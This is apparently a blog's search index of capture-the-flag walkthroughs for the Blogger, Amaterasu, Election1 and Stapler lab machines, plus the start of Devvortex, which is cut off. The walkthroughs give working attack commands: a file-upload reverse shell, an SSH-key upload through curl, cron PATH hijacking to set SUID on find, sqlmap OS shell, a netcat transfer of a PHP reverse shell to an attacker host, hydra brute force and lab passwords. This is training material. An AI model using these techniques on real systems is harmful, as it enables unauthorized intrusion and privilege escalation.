http://192.168.192.217/assets/js/ =&gt; Directory listing[####################] - 6m    122814/122814  360/s   http://192.168.192.217/assets/fonts/blog/ http://192.168.192.217/assets/fonts/blog/Redirect to Blogger domainSo, add Blogger in /etc/hosts.While enumerating the website, found http://blogger.pg/assets/fonts/blog/wp-login.php - ‘WordPress CMS identified’.WPSCAN wanting to discover users and vulnerable pluginswpscan --url http://blogger.pg/assets/fonts/blog/ --enumerate p --plugins-detection aggressive[i] User(s) Identified:[+] jm3s | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) ----------------------------------------------------------------------------------------- [i] Plugin(s) Identified:[+] akismet | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/ | Last Updated: 2024-05-31T16:57:00.000Z | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 5.3.2 | | Found By: Known Locations (Aggressive Detection) |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/, status: 200 | | Version: 4.0.8 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt[+] wpdiscuz | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/ | Last Updated: 2024-06-23T08:38:00.000Z | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt | [!] The version is out of date, the latest version is 7.6.20 | | Found By: Known Locations (Aggressive Detection) |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200 | | Version: 7.0.4 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txthttp://blogger.thm/assets/fonts/blog/The first article redirects to http://blogger.thm/assets/fonts/blog/?p=29, where the vulnerability ‘file upload insecure’ was found.3. ExploitationInsecure File Uploadhttp://blogger.thm/assets/fonts/blog/?p=29Modify the file’s signature because the application didn’t accept it.Modified to GIF formatAllowedClick the shell code and listen on port 1234 using the nc toolInitial Access4. Post-ExploitationLateral pivot to Vagrant with password ‘vagrant,’ then use sudo -l (Sudo Misconfiguration) to gain root access.Root Acess"
  },
  
  {
    "title": "Amaterasu",
    "url": "/posts/Proving-Grounds-Play-Amaterasu/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, API, Insecure File Upload, Suid Misconfiguration, Crontab",
    "date": "2024-08-15 00:00:00 -0300",
    





    
    "snippet": "The exploitation of the “Amaterasu” box involved several critical steps. First, intelligence gathering was conducted through a port scan using the nmap tool, identifying open ports such as 21 (FTP)...",
    "content": "The exploitation of the “Amaterasu” box involved several critical steps. First, intelligence gathering was conducted through a port scan using the nmap tool, identifying open ports such as 21 (FTP), 25022 (SSH), 33414 (API), and 40080 (HTTP). Enumeration revealed an FTP server with anonymous login allowed and a Flask-based REST API on port 33414, which permitted directory listing and file uploads. Exploitation was carried out by uploading an SSH public key to the target server, enabling SSH access. During post-exploitation, a scheduled cron job running a backup script was identified, and privilege escalation was achieved using a misconfigured SUID binary (find binary). The process included techniques for exploiting web vulnerabilities, file uploads, and privilege escalation, culminating in total system access.Overviewgraph TD    A[Intelligence Gathering]    A --&gt; B[Port Scan &gt; Ports 21,25022,33414,40080]    B --&gt; C[Enumeration: FTP, HTTP &gt; Flask-based REST API]    C --&gt; D[Exploitation &gt; Insecure File Upload, SSH Access]    D --&gt; E[Post-Exploitation: Privilege Escalation using Suid Misc. and Crontab]    E --&gt; F[Root Shell Access]1. Information GatheringPort Scannmap -sC -sV -p- --open 192.168.197.249 -T5 -vOutputPORT      STATE SERVICE VERSION21/tcp    open  ftp     vsftpd 3.0.3| ftp-syst: |   STAT: | FTP server status:|      Connected to 192.168.45.248|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      At session startup, client count was 3|      vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can't get directory listing: TIMEOUT25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)| ssh-hostkey: |   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)33414/tcp open  unknown| fingerprint-strings: |   GetRequest, HTTPOptions: |     HTTP/1.1 404 NOT FOUND|     Server: Werkzeug/2.2.3 Python/3.9.13|     Date: Tue, 02 Jul 2024 23:24:19 GMT|     Content-Type: text/html; charset=utf-8|     Content-Length: 207|     Connection: close|     &lt;!doctype html&gt;|     &lt;html lang=en&gt;|     &lt;title&gt;404 Not Found&lt;/title&gt;|     &lt;h1&gt;Not Found&lt;/h1&gt;|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;|   Help: |     &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"|     \"http://www.w3.org/TR/html4/strict.dtd\"&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;|     &lt;title&gt;Error response&lt;/title&gt;|     &lt;/head&gt;|     &lt;body&gt;|     &lt;h1&gt;Error response&lt;/h1&gt;|     &lt;p&gt;Error code: 400&lt;/p&gt;|     &lt;p&gt;Message: Bad request syntax ('HELP').&lt;/p&gt;|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;|     &lt;/body&gt;|     &lt;/html&gt;|   RTSPRequest: |     &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"|     \"http://www.w3.org/TR/html4/strict.dtd\"&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;|     &lt;title&gt;Error response&lt;/title&gt;|     &lt;/head&gt;|     &lt;body&gt;|     &lt;h1&gt;Error response&lt;/h1&gt;|     &lt;p&gt;Error code: 400&lt;/p&gt;|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;|     &lt;/body&gt;|_    &lt;/html&gt;40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))| http-methods: |   Supported Methods: GET POST OPTIONS HEAD TRACE|_  Potentially risky methods: TRACE|_http-title: My test page|_http-server-header: Apache/2.4.53 (Fedora)Resume21/tcp    open  ftp     vsftpd 3.0.325022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)33414/tcp open  unknown Server: Werkzeug/2.2.3 Python/3.9.1340080/tcp open  http    Apache httpd 2.4.53 ((Fedora))2. EnumerationPort 21Accepted login with an anonymous user.Port 40080Fuzzing of directories and filesferoxbuster -u http://192.168.197.249:40080 -k -C 404,403,500 --wordlist=/usr/share/wordlists/dirb/big.txt -x php,asp,txt,xml,bakOutput200      GET       41l       73w      495c http://192.168.197.249:40080/styles/style.css200      GET      219l     1187w   100265c http://192.168.197.249:40080/images/firefox-icon.png200      GET       25l      118w     1092c http://192.168.197.249:40080/200      GET      116l      998w     6555c http://192.168.197.249:40080/LICENSE301      GET        7l       20w      244c http://192.168.197.249:40080/images =&gt; http://192.168.197.249:40080/images/301      GET        7l       20w      244c http://192.168.197.249:40080/styles =&gt; http://192.168.197.249:40080/styles/Port 33414Directory ans Files fuzzingferoxbuster -u http://192.168.197.249:33414 -k -C 404,403,500 --wordlist=/usr/share/wordlists/dirb/big.txt -x php,asp,txt,xml,bakOutput200      GET        1l       19w      137c http://192.168.197.249:33414/help200      GET        1l       14w       98c http://192.168.197.249:33414/infoWeb server serving a REST API available at http://192.168.197.249:33414/infoEndpointhttp://192.168.197.249:33414/helpUsing /info and /help, we can list the directory and upload a file.Burp intercept (Repeater module)3. ExploitationInsecure File UploadI will upload my SSH private key to /file-upload.First, I will generate the key.ssh-keygen -t rsacd /home/0xfl0k1/.sshsudo chmod 600 id_rsa #this is what I will use to log insudo cp id_rsa.pub id_rsa.txt #this is what I will send to the server.Poc (file lista.txt)curl -X POST -F 'file=@/tmp/lista.txt' -F filename=\"/home/alfredo/lista.txt\" http://192.168.197.249:33414/file-upload ViewSend the key to the server.curl -i -L -X POST -H \"Content-Type: multipart/form-data\" -F file=\"@/tmp/id_rsa.txt\" -F filename=\"/home/alfredo/.ssh/authorized_keys\" http://192.168.197.249:33414/file-uploadInitial AccessLogin with SSH private keysudo ssh -oHostKeyAlgorithms=+ssh-dss alfredo@192.168.197.249 -p 25022 -i /home/0xfl0k1/.ssh/id_rsa4. Post-ExploitationThere is a backup-flask.sh task running every minute.cat /etc/crontab cat /usr/local/bin/backup-flas.shbackup-flask.sh#!/bin/shexport PATH=\"/home/alfredo/restapi:$PATH\"cd /home/alfredo/restapitar czf /tmp/flask.tar.gz *The script exports /home/alfredo/restapi to the PATH and then compresses the file contents using tar.Privilege Escalation  Find (with SUID) will be used to escalate privileges.  I will use the command /usr/bin/find and save it in a ‘tar’ file.nano tarchmod +x tartar#!/bin/bash chmod u+s /usr/bin/find #because the where is the \"find\"Search for SUID binaries.find / -perm -u=s -type f 2&gt;/dev/null[find        |                GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid)/usr/bin/find . -exec /bin/sh -p \\; -quitRoot Access"
  },
  
  {
    "title": "Election1",
    "url": "/posts/Proving-Grounds-Play-Election1/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "MEDIUM, Linux, Web, Exposed Credentials, Cookie Misconfiguration, SQL Injection",
    "date": "2024-07-10 00:00:00 -0300",
    





    
    "snippet": "Election1 is an interesting box that requires various skills to exploit and escalate privileges It starts with HTTP enumeration, identifying an Apache server hosting a vulnerable election managemen...",
    "content": "Election1 is an interesting box that requires various skills to exploit and escalate privileges It starts with HTTP enumeration, identifying an Apache server hosting a vulnerable election management system. Initial access was gained through exploiting SQL Injection vulnerabilities, leading to the discovery of exposed credentials. These credentials were used to access the administrative panel of the election system.A remote code execution vulnerability was exploited using SQLMap, allowing the upload of a PHP reverse shell to gain initial shell access.Privilege escalation involved lateral movement by inspecting log files, revealing additional credentials. These credentials facilitated further access, where SUID binaries and running processes were analyzed.The final privilege escalation was achieved by exploiting a known vulnerability in the Serv-U binary with SUID permissions, ultimately leading to root access.Overviewgraph TD    A[Intelligence Gathering]    A --&gt; B[Port Scan: Port 80,22]    B --&gt; C[Enumeration: HTTP &gt; Exposed Credentials]    C --&gt; D[Exploitation &gt; Admin access, Cookie, SQLi]    D --&gt; E[Post-Exploitation: Lateral Escalation &gt; Sensitives Files]    E --&gt; F[Privilege Escalation: Serv-U With Suid Misc.]    F --&gt; G[Root Shell Access]1. Intelligence GatheringPort Scansudo nmap -Pn -sV -sC -p- --open 192.168.233.211 -T5 -v OutputPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_  Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelsearching for vulnsudo nmap --script=vuln -p22,80 192.168.233.211outputPORT   STATE SERVICE22/tcp open  ssh80/tcp open  http|_http-dombased-xss: Couldn't find any DOM based XSS.|_http-csrf: Couldn't find any CSRF vulnerabilities.|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.| http-enum: |   /robots.txt: Robots file|   /phpinfo.php: Possible information file|_  /phpmyadmin/: phpMyAdmin2. EnumerationPort 80  Robots.txthttp://192.168.233.211/robots.txt  phpmyadmin  phpinfo.php  PHP Version 7.1.33-14Fuzzing of directories and filesferoxbuster -u http://192.168.233.211/ -k -C 404,403,500 --wordlist=/usr/share/wordlists/dirb/big.txt -x php,asp,txt,xml,bak,logoutput301      GET        9l       28w      321c http://192.168.216.211/election =&gt; http://192.168.216.211/election/301      GET        9l       28w      327c http://192.168.216.211/election/admin =&gt; http://192.168.216.211/election/admin/CMShttp://192.168.233.211/election/here was access to the administrative dashboard.http://192.168.216.211/election/card.phpDecryption with the magic tool.  user:1234␊pass:Zxc123!@#http://192.168.216.211/election/admin/Access to the admin panel.3. ExploitationTo realize this exploitation, I used the reference to the Election 2.0 vulnerability on the Medium website.https://medium.com/@h.kehn1/election-2-0-authenticated-remote-code-execution-vulnerability-f603491adb74Create a new ‘candidate’.To edit, Burp Suite was used to intercept the request.Save the request.reqPOST /election/admin/ajax/op_kandidat.php HTTP/1.1Host: 192.168.216.211User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 16Origin: http://192.168.216.211Connection: closeReferer: http://192.168.216.211/election/admin/kandidat.php?_addedCookie: el_listing_panitia=5; el_mass_adding=false; el_listing_guru=5; PHPSESSID=4b8evpp42r24ge0j3rcr5p8cl0; el_lang=en-usaksi=fetch&amp;id=77injection with sqlmapsqlmap -r req --level=5 --risk=3 --os-shell -p idSelect [4] PHPSelect [4] brute force searchGetting the OS shellCreate the php reverse shellcp /usr/share/webshells/php/php-reverse-shell.php .mv php-reverse-shell.php fl0k1.phpTo send it with the nc tool#KALIrlwrap -cAr nc -nlvp 1234 &lt; fl0k1.php#TARGETnc 192.168.45.190 1234 &gt; fl0k1.phpExecute PHP reverse shellphp fl0k1.phpInitial Access4. Post-ExploitationImporting the shell with python3python3 -c 'import pty;pty.spawn(\"/bin/bash\")'4.1 Lateral EscalationSearching to log filefind / -name *.log 2&gt;/dev/nullFound the credentials admin  user love: P@$$w0rd@1234.2 Privilege Escalationsu love #after put the pass P@$$w0rd@123Search for suid binariesfind / -perm -4000 2&gt;/dev/nullCheck the processesps aux | grep servSearch to public exploit (”serv-u exploit in google”) and found: https://www.exploit-db.com/exploits/47009InstructionsExplanation:Serv-U is an FTP (File Transfer Protocol) server software that might be installed on the system. If there is a known vulnerability in this software and it is running with elevated privileges, it can be exploited to gain root access.Root AccessCompile &amp; Rungcc 47009.c -o pe &amp;&amp; ./pe"
  },
  
  {
    "title": "Stapler",
    "url": "/posts/Proving-Gronds-Play-Stapler/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "MEDIUM, Linux, Web, SMB, Sudo Misconfiguration",
    "date": "2024-07-10 00:00:00 -0300",
    





    
    "snippet": "Stapler was an interesting box that required various skills to exploit and escalate privileges. It began with port enumeration, identifying several vulnerable services, including FTP, SSH, and SMB....",
    "content": "Stapler was an interesting box that required various skills to exploit and escalate privileges. It began with port enumeration, identifying several vulnerable services, including FTP, SSH, and SMB.Initial access was obtained through anonymous FTP login, revealing a note with usernames. SMB enumeration revealed more users, which were used to create a list of names.The exploitation involved brute-forcing SSH using the list of usernames, resulting in access with valid credentials. This allowed entry into the system.The lateral escalation was achieved using the tool LinEnum.sh, which identified that the user Peter could execute commands as root.The final privilege escalation was achieved by executing a root shell as the user Peter, resulting in full system access.Overviewgraph TD     A[Intelligence Gathering]    A --&gt; B[Port Scan &gt; Ports 21,22,53,80,139,666,3306,12380]    B --&gt; C[Enumeration: FTP, SMB]    C --&gt; D[Exploitation &gt; Brute Force SSH]    D --&gt; E[Post-Exploitation: Privilege Escalation through Sudo Misconfiguration]    E --&gt; F[Root Shell Access]1. Information GatheringPort ScanAll portssudo nmap -Pn -sV -p- --open 192.168.186.148 -T5 -v OutputPORT      STATE SERVICE     VERSION21/tcp    open  ftp         vsftpd 2.0.8 or later22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)53/tcp    open  tcpwrapped80/tcp    open  http        PHP cli server 5.5 or later139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)666/tcp   open  doom?3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu112380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port666-TCP:V=7.94SVN%I=7%D=7/9%Time=668DD942%P=x86_64-pc-linux-gnu%r(NSF:ULL,2D58,\"PK\\x03\\x04\\x14\\0\\x02\\0\\x08\\0d\\x80\\xc3Hp\\xdf\\x15\\x81\\xaa,\\0\\0\\SF:x152\\0\\0\\x0c\\0\\x1c\\0message2\\.jpgUT\\t\\0\\x03\\+\\x9cQWJ\\x9cQWux\\x0b\\0\\x01\\SF:x04\\xf5\\x01\\0\\0\\x04\\x14\\0\\0\\0\\xadz\\x0bT\\x13\\xe7\\xbe\\xefP\\x94\\x88\\x88A@\\SF:xa2\\x20\\x19\\xabUT\\xc4T\\x11\\xa9\\x102&gt;\\x8a\\xd4RDK\\x15\\x85Jj\\xa9\\\"DL\\[E\\xaSF:2\\x0c\\x19\\x140&lt;\\xc4\\xb4\\xb5\\xca\\xaen\\x89\\x8a\\x8aV\\x11\\x91W\\xc5H\\x20\\x0fSF:\\xb2\\xf7\\xb6\\x88\\n\\x82@%\\x99d\\xb7\\xc8#;3\\[\\r_\\xcddr\\x87\\xbd\\xcf9\\xf7\\xaSF:eu\\xeeY\\xeb\\xdc\\xb3oX\\xacY\\xf92\\xf3e\\xfe\\xdf\\xff\\xff\\xff=2\\x9f\\xf3\\x99\\SF:xd3\\x08y}\\xb8a\\xe3\\x06\\xc8\\xc5\\x05\\x82&gt;`\\xfe\\x20\\xa7\\x05:\\xb4y\\xaf\\xf8\\SF:xa0\\xf8\\xc0\\^\\xf1\\x97sC\\x97\\xbd\\x0b\\xbd\\xb7nc\\xdc\\xa4I\\xd0\\xc4\\+j\\xce\\[SF:\\x87\\xa0\\xe5\\x1b\\xf7\\xcc=,\\xce\\x9a\\xbb\\xeb\\xeb\\xdds\\xbf\\xde\\xbd\\xeb\\x8bSF:\\xf4\\xfdis\\x0f\\xeeM\\?\\xb0\\xf4\\x1f\\xa3\\xcceY\\xfb\\xbe\\x98\\x9b\\xb6\\xfb\\xe0SF:\\xdc\\]sS\\xc5bQ\\xfa\\xee\\xb7\\xe7\\xbc\\x05AoA\\x93\\xfe9\\xd3\\x82\\x7f\\xcc\\xe4\\SF:xd5\\x1dx\\xa2O\\x0e\\xdd\\x994\\x9c\\xe7\\xfe\\x871\\xb0N\\xea\\x1c\\x80\\xd63w\\xf1\\SF:xaf\\xbd&amp;&amp;q\\xf9\\x97'i\\x85fL\\x81\\xe2\\\\\\xf6\\xb9\\xba\\xcc\\x80\\xde\\x9a\\xe1\\xeSF:2:\\xc3\\xc5\\xa9\\x85`\\x08r\\x99\\xfc\\xcf\\x13\\xa0\\x7f{\\xb9\\xbc\\xe5:i\\xb2\\x1bSF:k\\x8a\\xfbT\\x0f\\xe6\\x84\\x06/\\xe8-\\x17W\\xd7\\xb7&amp;\\xb9N\\x9e&lt;\\xb1\\\\\\.\\xb9\\xcSF:c\\xe7\\xd0\\xa4\\x19\\x93\\xbd\\xdf\\^\\xbe\\xd6\\xcdg\\xcb\\.\\xd6\\xbc\\xaf\\|W\\x1c\\xSF:fd\\xf6\\xe2\\x94\\xf9\\xebj\\xdbf~\\xfc\\x98x'\\xf4\\xf3\\xaf\\x8f\\xb9O\\xf5\\xe3\\xcSF:c\\x9a\\xed\\xbf`a\\xd0\\xa2\\xc5KV\\x86\\xad\\n\\x7fou\\xc4\\xfa\\xf7\\xa37\\xc4\\|\\xbSF:0\\xf1\\xc3\\x84O\\xb6nK\\xdc\\xbe#\\)\\xf5\\x8b\\xdd{\\xd2\\xf6\\xa6g\\x1c8\\x98u\\(\\[SF:r\\xf8H~A\\xe1qYQq\\xc9w\\xa7\\xbe\\?}\\xa6\\xfc\\x0f\\?\\x9c\\xbdTy\\xf9\\xca\\xd5\\xaSF:ak\\xd7\\x7f\\xbcSW\\xdf\\xd0\\xd8\\xf4\\xd3\\xddf\\xb5F\\xabk\\xd7\\xff\\xe9\\xcf\\x7fSF:y\\xd2\\xd5\\xfd\\xb4\\xa7\\xf7Y_\\?n2\\xff\\xf5\\xd7\\xdf\\x86\\^\\x0c\\x8f\\x90\\x7f\\xSF:7f\\xf9\\xea\\xb5m\\x1c\\xfc\\xfef\\\"\\.\\x17\\xc8\\xf5\\?B\\xff\\xbf\\xc6\\xc5,\\x82\\xcSF:b\\[\\x93&amp;\\xb9NbM\\xc4\\xe5\\xf2V\\xf6\\xc4\\t3&amp;M~{\\xb9\\x9b\\xf7\\xda-\\xac\\]_\\xf9SF:\\xcc\\[qt\\x8a\\xef\\xbao/\\xd6\\xb6\\xb9\\xcf\\x0f\\xfd\\x98\\x98\\xf9\\xf9\\xd7\\x8f\\SF:xa7\\xfa\\xbd\\xb3\\x12_@N\\x84\\xf6\\x8f\\xc8\\xfe{\\x81\\x1d\\xfb\\x1fE\\xf6\\x1f\\x8SF:1\\xfd\\xef\\xb8\\xfa\\xa1i\\xae\\.L\\xf2\\\\g@\\x08D\\xbb\\xbfp\\xb5\\xd4\\xf4Ym\\x0bI\\SF:x96\\x1e\\xcb\\x879-a\\)T\\x02\\xc8\\$\\x14k\\x08\\xae\\xfcZ\\x90\\xe6E\\xcb&lt;C\\xcap\\xSF:8f\\xd0\\x8f\\x9fu\\x01\\x8dvT\\xf0'\\x9b\\xe4ST%\\x9f5\\x95\\xab\\rSWb\\xecN\\xfb&amp;\\xSF:f4\\xed\\xe3v\\x13O\\xb73A#\\xf0,\\xd5\\xc2\\^\\xe8\\xfc\\xc0\\xa7\\xaf\\xab4\\xcfC\\xcSF:d\\x88\\x8e}\\xac\\x15\\xf6~\\xc4R\\x8e`wT\\x96\\xa8KT\\x1cam\\xdb\\x99f\\xfb\\n\\xbc\\SF:xbcL}AJ\\xe5H\\x912\\x88\\(O\\0k\\xc9\\xa9\\x1a\\x93\\xb8\\x84\\x8fdN\\xbf\\x17\\xf5\\xSF:f0\\.npy\\.9\\x04\\xcf\\x14\\x1d\\x89Rr9\\xe4\\xd2\\xae\\x91#\\xfbOg\\xed\\xf6\\x15\\x0SF:4\\xf6~\\xf1\\]V\\xdcBGu\\xeb\\xaa=\\x8e\\xef\\xa4HU\\x1e\\x8f\\x9f\\x9bI\\xf4\\xb6GTQSF:\\xf3\\xe9\\xe5\\x8e\\x0b\\x14L\\xb2\\xda\\x92\\x12\\xf3\\x95\\xa2\\x1c\\xb3\\x13\\*P\\x1SF:1\\?\\xfb\\xf3\\xda\\xcaDfv\\x89`\\xa9\\xe4k\\xc4S\\x0e\\xd6P0\");Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernelSearching for vulnerabilities in servicesnmap -v -Pn 192.168.186.148 -p139,53,22,21,3306,80,12380 --script=vulnOutputPORT      STATE SERVICE21/tcp    open  ftp22/tcp    open  ssh53/tcp    open  domain80/tcp    open  http|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.|_http-dombased-xss: Couldn't find any DOM based XSS.|_http-csrf: Couldn't find any CSRF vulnerabilities.| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server's resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_      http://ha.ckers.org/slowloris/139/tcp   open  netbios-ssn3306/tcp  open  mysql|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)12380/tcp open  unknownHost script results:| smb-vuln-cve2009-3103: |   VULNERABLE:|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)|     State: VULNERABLE|     IDs:  CVE:CVE-2009-3103|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,|           aka \"SMBv2 Negotiation Vulnerability.\"|           |     Disclosure date: 2009-09-08|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103|_smb-vuln-ms10-061: false|_smb-vuln-ms10-054: false| smb-vuln-regsvc-dos: |   VULNERABLE:|   Service regsvc in Microsoft Windows systems vulnerable to denial of service|     State: VULNERABLE|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes|       while working on smb-enum-sessions.|_ 2. EnumerationPort 21Login was successful with anonymous credentialsnote fileElly, make sure you update the payload information. Leave it in your FTP account once your are done, John.  Users: Elly, John.Port 139searching for usersenum4linux 192.168.233.148share of directory ================================( Share Enumeration on 192.168.233.148 )================================\tSharename       Type      Comment\t---------       ----      -------\tprint$          Disk      Printer Drivers\tkathy           Disk      Fred, What are we doing here?\ttmp             Disk      All temporary files should be stored here\tIPC$            IPC       IPC Service (red server (Samba, Ubuntu))Additional users[+] Enumerating users using SID S-1-22-1 and logon username '', password ''S-1-22-1-1000 Unix User\\peter (Local User)S-1-22-1-1001 Unix User\\RNunemaker (Local User)S-1-22-1-1002 Unix User\\ETollefson (Local User)S-1-22-1-1003 Unix User\\DSwanger (Local User)S-1-22-1-1004 Unix User\\AParnell (Local User)S-1-22-1-1005 Unix User\\SHayslett (Local User)S-1-22-1-1006 Unix User\\MBassin (Local User)S-1-22-1-1007 Unix User\\JBare (Local User)S-1-22-1-1008 Unix User\\LSolum (Local User)S-1-22-1-1009 Unix User\\IChadwick (Local User)S-1-22-1-1010 Unix User\\MFrei (Local User)S-1-22-1-1011 Unix User\\SStroud (Local User)S-1-22-1-1012 Unix User\\CCeaser (Local User)S-1-22-1-1013 Unix User\\JKanode (Local User)S-1-22-1-1014 Unix User\\CJoo (Local User)S-1-22-1-1015 Unix User\\Eeth (Local User)S-1-22-1-1016 Unix User\\LSolum2 (Local User)S-1-22-1-1017 Unix User\\JLipps (Local User)S-1-22-1-1018 Unix User\\jamie (Local User)S-1-22-1-1019 Unix User\\Sam (Local User)S-1-22-1-1020 Unix User\\Drew (Local User)S-1-22-1-1021 Unix User\\jess (Local User)S-1-22-1-1022 Unix User\\SHAY (Local User)S-1-22-1-1023 Unix User\\Taylor (Local User)S-1-22-1-1024 Unix User\\mel (Local User)S-1-22-1-1025 Unix User\\kai (Local User)S-1-22-1-1026 Unix User\\zoe (Local User)S-1-22-1-1027 Unix User\\NATHAN (Local User)S-1-22-1-1028 Unix User\\www (Local User)S-1-22-1-1029 Unix User\\elly (Local User)Create a list of usernames and passwordscat list.txt | cut -d '\\' -f2 | cut -d \" \" -f1 &gt; names.txtOutputpeterRNunemakerETollefsonDSwangerAParnellSHayslettMBassinJBareLSolumIChadwickMFreiSStroudCCeaserJKanodeCJooEethLSolum2JLippsjamieSamDrewjessSHAYTaylormelkaizoeNATHANwwwelly3. ExploitationBrute Force SSHhydra -L names.txt  -P names.txt -f 192.168.233.148 ssh  -vVOutputInitial Accessssh [SHayslett@192.168.233.148](mailto:SHayslett@192.168.233.148)4. Post-ExploitationLateral Escalationused the tool LinEnum.shhttps://github.com/rebootuser/LinEnum/blob/master/LinEnum.shTargetchmod + LinEnum.sh./LinEnum.shPeter can execute commands as rootPrivilege EscalationRoot Accesssudo bash"
  },
  
  {
    "title": "Devvortex",
    "url": "/posts/Hack-The-Box-Devvortex/",
    "categories": "CTF, Hack The Box",
    "tags": "EASY, Linux, Joomla, Local File Include, CVE-2023-23752, apport-cli 2.26.0, CVE-2023-1326",
    "date": "2024-07-05 00:00:00 -0300",
    





    
    "snippet": "The exploration of this machine began with scanning for open ports using nmap, identifying key services such as SSH and HTTP. A thorough enumeration revealed a Joomla installation vulnerable to CVE...",
    "content": "The exploration of this machine began with scanning for open ports using nmap, identifying key services such as SSH and HTTP. A thorough enumeration revealed a Joomla installation vulnerable to CVE-2023-23752, allowing unauthorized information disclosure. Exploiting this vulnerability provided access to credentials, which were used to gain further access to the system. A reverse shell was uploaded, leading to initial access. Post-exploitation involved privilege escalation through a known vulnerability, CVE-2023-1326, ultimately granting root access.Overviewgraph TD    A[Inteligence Gathering]    A --&gt; B[Port Scan &gt; Ports 22, 80]    B --&gt; C[Enumeration: HTTP &gt; Joomla]    C --&gt; D[Exploitation &gt; CVE-2023-23752, LFI]    D --&gt; E[Post-Exploitation: Privilege Escalation &gt; Apport-Cli 2.26.0]    E --&gt; F[Root Shell Access]1. Intelligence GatheringPort Scannmap -Pn -sS --top-ports=10 10.10.11.242It seems there is no defense mechanism, so a scan will be conducted on all ports of the host.nmap 